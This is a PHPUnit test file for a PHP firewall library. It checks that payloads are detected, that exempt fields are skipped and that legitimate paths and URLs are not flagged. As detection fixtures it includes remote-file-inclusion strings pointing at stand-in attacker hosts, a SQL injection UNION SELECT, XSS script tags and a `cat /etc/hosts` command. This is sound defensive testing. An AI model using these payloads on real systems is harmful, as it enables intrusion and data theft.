<?php

declare(strict_types=1);

use PHPUnit\Framework\TestCase;
use Webrium\XZeroProtect\PatternDetector;
use Webrium\XZeroProtect\Request;
use Webrium\XZeroProtect\XZeroProtect;

/**
 * Comprehensive tests for payload scanning, field exemptions, and false-positive prevention.
 */
class PayloadScanningTest extends TestCase
{
    private PatternDetector $detector;

    protected function setUp(): void
    {
        $this->detector = new PatternDetector(dirname(__DIR__) . '/rules');
        $_GET = [];
        $_POST = [];
        $_COOKIE = [];
        $_SERVER['REQUEST_URI'] = '/';
        $_SERVER['REQUEST_METHOD'] = 'POST';
    }

    public function test_relative_path_traversal_in_post_title_or_body_is_not_blocked(): void
    {
        $samples = [
            'How to reference ../css/styles.css in HTML',
            'Relative path: ../../src/Controllers/HomeController.php',
            'cd ../my-project',
            'import styles from "../styles/theme.module.css";',
            '../README.md is located in parent directory',
            'Back to parent directory: ../',
            'مسیر فایل در ../assets/main.js ذخیره شده است',
            'راهنمای بازگشت به پوشه قبل با استفاده از ../',
        ];

        foreach ($samples as $sample) {
            $this->assertNull(
                $this->detector->detectPayload($sample),
                "Sample should not trigger payload detection: {$sample}"
            );
        }
    }

    public function test_links_to_text_files_and_web_pages_are_not_flagged_as_rfi(): void
    {
        $samples = [
            'See documentation at https://example.com/readme.txt',
            'http://test.com/index.php?page=home&user=1',
            'https://raw.githubusercontent.com/org/repo/main/license.txt',
            'ftp://ftp.example.com/archive.txt',
            'لینک مستندات: https://my-site.ir/api/v1/index.php?action=view',
        ];

        foreach ($samples as $sample) {
            $this->assertNull(
                $this->detector->detectPayload($sample),
                "Legitimate URL should not trigger RFI: {$sample}"
            );
        }
    }

    public function test_actual_rfi_with_executable_script_is_detected(): void
    {
        $this->assertSame('rfi', $this->detector->detectPayload('include("http://attacker.com/malicious_shell.php")'));
        $this->assertSame('rfi', $this->detector->detectPayload('?file=https://evil.org/backdoor.phtml'));
        $this->assertSame('rfi', $this->detector->detectPayload('page=http://attacker.com/shell.php'));
        $this->assertSame('rfi', $this->detector->detectPayload('template=ftp://evil.com/exploit.php'));
    }

    public function test_request_raw_input_skips_exempt_fields(): void
    {
        $_POST = [
            'title'   => 'Article about SQL Injection',
            'content' => 'Example: 1\' UNION SELECT username, password FROM users--',
            'tags'    => 'security, tutorial',
        ];

        $request = new Request();

        // Without exemptions, 'content' is included and contains SQLi
        $allInput = $request->rawInput();
        $this->assertStringContainsString('UNION SELECT', $allInput);
        $this->assertNotNull($this->detector->detectPayload($allInput));

        // With 'content' exempted, the dangerous snippet in 'content' is omitted
        $filteredInput = $request->rawInput(['content']);
        $this->assertStringNotContainsString('UNION SELECT', $filteredInput);
        $this->assertStringContainsString('Article about SQL Injection', $filteredInput);
        $this->assertNull($this->detector->detectPayload($filteredInput));
    }

    public function test_request_raw_input_is_case_insensitive_for_exempt_fields(): void
    {
        $_POST = [
            'BODY' => '<script>alert("test");</script>',
            'name' => 'John Doe',
        ];

        $request = new Request();
        $filtered = $request->rawInput(['body']);

        $this->assertStringNotContainsString('script', $filtered);
        $this->assertStringContainsString('John Doe', $filtered);
    }

    public function test_request_raw_input_supports_nested_array_filtering(): void
    {
        $_POST = [
            'user' => [
                'name'    => 'Ali',
                'bio'     => 'System administrator: `cat /etc/hosts` in markdown',
                'comment' => 'Regular comment',
            ],
        ];

        $request = new Request();
        $filtered = $request->rawInput(['bio']);

        $this->assertStringNotContainsString('cat /etc/hosts', $filtered);
        $this->assertStringContainsString('Ali', $filtered);
        $this->assertStringContainsString('Regular comment', $filtered);
    }

    public function test_non_exempt_fields_with_attacks_are_still_caught(): void
    {
        $_POST = [
            'title'   => '<script>alert("XSS in title")</script>',
            'content' => 'This is clean content mentioning ../assets/logo.png',
        ];

        $request = new Request();
        // Even if 'content' is exempted, the XSS in 'title' is scanned and detected
        $filtered = $request->rawInput(['content']);

        $this->assertSame('xss_script', $this->detector->detectPayload($filtered));
    }

    public function test_request_sources_selection(): void
    {
        $_GET = ['search' => 'normal query'];
        $_POST = ['comment' => '<script>alert(1)</script>'];
        $_COOKIE = ['session' => 'abc123'];

        $request = new Request();

        // Scan only GET source
        $getInput = $request->rawInput([], ['get']);
        $this->assertSame('normal query', $getInput);
        $this->assertNull($this->detector->detectPayload($getInput));

        // Scan POST source
        $postInput = $request->rawInput([], ['post']);
        $this->assertNotNull($this->detector->detectPayload($postInput));
    }

    public function test_pattern_detector_exempt_fields_management(): void
    {
        $this->assertEmpty($this->detector->getExemptFields());

        $this->detector->exemptField('content');
        $this->detector->exemptFields(['body', 'description']);

        $exempts = $this->detector->getExemptFields();
        $this->assertContains('content', $exempts);
        $this->assertContains('body', $exempts);
        $this->assertContains('description', $exempts);

        $this->detector->clearExemptFields();
        $this->assertEmpty($this->detector->getExemptFields());
    }

    public function test_xzeroprotect_convenience_methods_and_config(): void
    {
        $storageDir = sys_get_temp_dir() . '/xzp_test_' . uniqid();
        mkdir($storageDir);

        $firewall = XZeroProtect::init([
            'storage_path' => $storageDir,
            'payload_scan' => [
                'exempt_fields' => ['content', 'markdown_body'],
                'sources'       => ['get', 'post'],
            ],
        ]);

        $this->assertContains('content', $firewall->patterns->getExemptFields());
        $this->assertContains('markdown_body', $firewall->patterns->getExemptFields());

        $firewall->exemptField('custom_field');
        $this->assertContains('custom_field', $firewall->patterns->getExemptFields());

        $firewall->exemptFields(['extra_field_1', 'extra_field_2']);
        $this->assertContains('extra_field_1', $firewall->patterns->getExemptFields());
        $this->assertContains('extra_field_2', $firewall->patterns->getExemptFields());

        // Cleanup
        $this->removeDirectory($storageDir);
    }

    private function removeDirectory(string $dir): void
    {
        if (!is_dir($dir)) {
            return;
        }
        $files = array_diff(scandir($dir) ?: [], ['.', '..']);
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            is_dir($path) ? $this->removeDirectory($path) : @unlink($path);
        }
        @rmdir($dir);
    }
}
